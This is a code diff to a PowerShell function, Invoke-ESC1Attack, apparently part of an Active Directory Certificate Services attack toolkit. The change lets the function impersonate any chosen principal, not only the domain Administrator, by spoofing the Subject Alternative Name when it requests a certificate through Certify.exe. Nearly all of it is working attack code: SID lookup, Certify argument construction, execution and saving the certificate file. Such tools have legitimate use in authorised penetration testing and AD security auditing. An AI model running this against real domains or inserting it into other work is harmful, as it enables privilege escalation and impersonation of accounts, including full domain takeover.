@@ -1,12 +1,13 @@
 function Invoke-ESC1Attack {
     <#
         .SYNOPSIS
-        Performs an ESC1 attack by requesting a certificate with Administrator SAN using Certify.exe.
+        Performs an ESC1 attack by requesting a certificate with specified principal SAN using Certify.exe.
 
         .DESCRIPTION
         This function executes an ESC1 (SAN Spoofing) attack against a vulnerable certificate template.
         It uses Certify.exe to request a certificate from the specified template while spoofing the 
-        Subject Alternative Name (SAN) to impersonate the local Administrator account (RID 500).
+        Subject Alternative Name (SAN) to impersonate any specified security principal. If no target
+        principal is specified, it defaults to the local Administrator account (RID 500).
         
         ESC1 attacks exploit templates that:
         1. Allow SAN specification (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag set)
@@ -30,9 +31,10 @@ function Invoke-ESC1Attack {
         .PARAMETER OutputPath
         Directory where certificate files (.pfx) will be saved. Defaults to current directory.
 
-        .PARAMETER AdministratorSID
-        The SID of the Administrator account to impersonate. If not specified, automatically
-        discovers the local Administrator account (RID 500) SID.
+        .PARAMETER TargetPrincipal
+        DirectoryEntry object representing the security principal to impersonate in the certificate.
+        If not specified, automatically discovers and uses the domain Administrator account (RID 500).
+        Can also accept principals resolved using Resolve-Principal function.
 
         .PARAMETER WhatIf
         Shows what attack would be performed without actually executing Certify.exe.
@@ -51,13 +53,19 @@ function Invoke-ESC1Attack {
         Invoke-ESC1Attack -TemplateObject $VulnTemplate
 
         .EXAMPLE
-        # Attack with specific CA and output path
+        # Attack with specific target principal
+        $TargetUser = Resolve-Principal -Identity "Administrator"
         $Template = Get-AdcsObjects | Where-Object { $_.Properties['name'].Value -eq 'User' }
-        Invoke-ESC1Attack -TemplateObject $Template -CertificateAuthority "DC01\horse-DC01-CA" -OutputPath "C:\Temp"
+        Invoke-ESC1Attack -TemplateObject $Template -TargetPrincipal $TargetUser
 
         .EXAMPLE
         # Use with pipeline from ConvertTo-ESC1
         $ESC4Issue | ConvertTo-ESC1 -PassThru | Invoke-ESC1Attack
+
+        .EXAMPLE
+        # Attack with different target user
+        $TargetUser = Resolve-Principal -Identity "DOMAIN\user1"
+        Invoke-ESC1Attack -TemplateObject $Template -TargetPrincipal $TargetUser
 
         .NOTES
         WARNING: This function performs actual certificate attacks that can compromise security.
@@ -89,7 +97,7 @@ function Invoke-ESC1Attack {
         [string]$OutputPath = ".",
         
         [Parameter()]
-        [string]$AdministratorSID
+        [System.DirectoryServices.DirectoryEntry]$TargetPrincipal
     )
 
     #requires -Version 5
@@ -195,29 +203,56 @@ function Invoke-ESC1Attack {
             Write-Warning "Template '$templateName' requires manager approval (CT_FLAG_PEND_ALL_REQUESTS set)"
         }
         
-        # Determine Administrator SID if not provided
-        if (-not $AdministratorSID) {
+        # Determine target principal SID
+        $targetSID = $null
+        $targetName = $null
+        
+        if ($TargetPrincipal) {
+            # Extract SID from DirectoryEntry object
+            try {
+                if ($TargetPrincipal.Properties['objectSid'].Value) {
+                    $sidObj = New-Object System.Security.Principal.SecurityIdentifier($TargetPrincipal.Properties['objectSid'].Value, 0)
+                    $targetSID = $sidObj.Value
+                    $targetName = $TargetPrincipal.Properties['sAMAccountName'].Value
+                    Write-Verbose "Using target principal: $targetName (SID: $targetSID)"
+                } else {
+                    throw "Target principal does not have a valid SID"
+                }
+            } catch {
+                Write-Error "Failed to extract SID from target principal: $($_.Exception.Message)"
+                return [PSCustomObject]@{
+                    Success = $false
+                    TemplateName = $templateName
+                    Error = "Invalid target principal"
+                    CertificatePath = $null
+                    CertifyOutput = $null
+                }
+            }
+        } else {
+            # Default: Use Administrator account (RID 500)
             try {
                 # Construct Administrator SID (Domain SID + RID 500)
                 if ($domainSid) {
-                    $AdministratorSID = "$domainSid-500"
-                    Write-Verbose "Constructed Administrator SID: $AdministratorSID"
+                    $targetSID = "$domainSid-500"
+                    $targetName = "Administrator"
+                    Write-Verbose "Using default Administrator account (SID: $targetSID)"
                 } else {
                     # Fallback: try to find Administrator account directly
                     $adminUser = Get-WmiObject -Class Win32_UserAccount -Filter "SID LIKE '%-500'"
                     if ($adminUser) {
-                        $AdministratorSID = $adminUser.SID
-                        Write-Verbose "Found Administrator SID via WMI: $AdministratorSID"
+                        $targetSID = $adminUser.SID
+                        $targetName = $adminUser.Name
+                        Write-Verbose "Found Administrator account via WMI: $targetName (SID: $targetSID)"
                     } else {
                         throw "Could not determine Administrator SID"
                     }
                 }
             } catch {
-                Write-Error "Failed to determine Administrator SID: $($_.Exception.Message)"
+                Write-Error "Failed to determine target principal: $($_.Exception.Message)"
                 return [PSCustomObject]@{
                     Success = $false
                     TemplateName = $templateName
-                    Error = "Could not determine Administrator SID"
+                    Error = "Could not determine target principal"
                     CertificatePath = $null
                     CertifyOutput = $null
                 }
@@ -289,7 +324,7 @@ function Invoke-ESC1Attack {
             "--template"
             $templateName
             "--sid"
-            $AdministratorSID
+            $targetSID
             "--out-file"
             $certFilePath
         )
@@ -300,7 +335,7 @@ function Invoke-ESC1Attack {
         if ($PSCmdlet.ShouldProcess("Template: $templateName", "ESC1 Attack - Request certificate with Administrator SAN")) {
             try {
                 Write-Warning "Executing ESC1 attack against template '$templateName'"
-                Write-Warning "Requesting certificate with Administrator SAN: $AdministratorSID"
+                Write-Warning "Requesting certificate with target principal SAN: $targetName ($targetSID)"
                 
                 $certifyOutput = & $CertifyPath $certifyArgs 2>&1
                 $exitCode = $LASTEXITCODE
@@ -326,7 +361,8 @@ function Invoke-ESC1Attack {
                         Success = $true
                         TemplateName = $templateName
                         CertificatePath = $certFilePath
-                        AdministratorSID = $AdministratorSID
+                        TargetPrincipal = $targetName
+                        TargetSID = $targetSID
                         CertificateAuthority = $CertificateAuthority
                         CertifyOutput = $certifyOutput -join "`n"
                         ExitCode = $exitCode
@@ -350,7 +386,7 @@ function Invoke-ESC1Attack {
         } else {
             # WhatIf mode
             Write-Host "What if: Would execute ESC1 attack against template '$templateName'" -ForegroundColor Yellow
-            Write-Host "What if: Would request certificate with Administrator SAN: $AdministratorSID" -ForegroundColor Yellow
+            Write-Host "What if: Would request certificate with target principal SAN: $targetName ($targetSID)" -ForegroundColor Yellow
             Write-Host "What if: Would save certificate to: $certFilePath" -ForegroundColor Yellow
             Write-Host "What if: Certify command: $CertifyPath $($certifyArgs -join ' ')" -ForegroundColor Yellow
             
@@ -358,7 +394,8 @@ function Invoke-ESC1Attack {
                 Success = $true
                 TemplateName = $templateName
                 CertificatePath = $certFilePath
-                AdministratorSID = $AdministratorSID
+                TargetPrincipal = $targetName
+                TargetSID = $targetSID
                 CertificateAuthority = $CertificateAuthority
                 CertifyOutput = "WhatIf mode - attack not executed"
                 ExitCode = 0
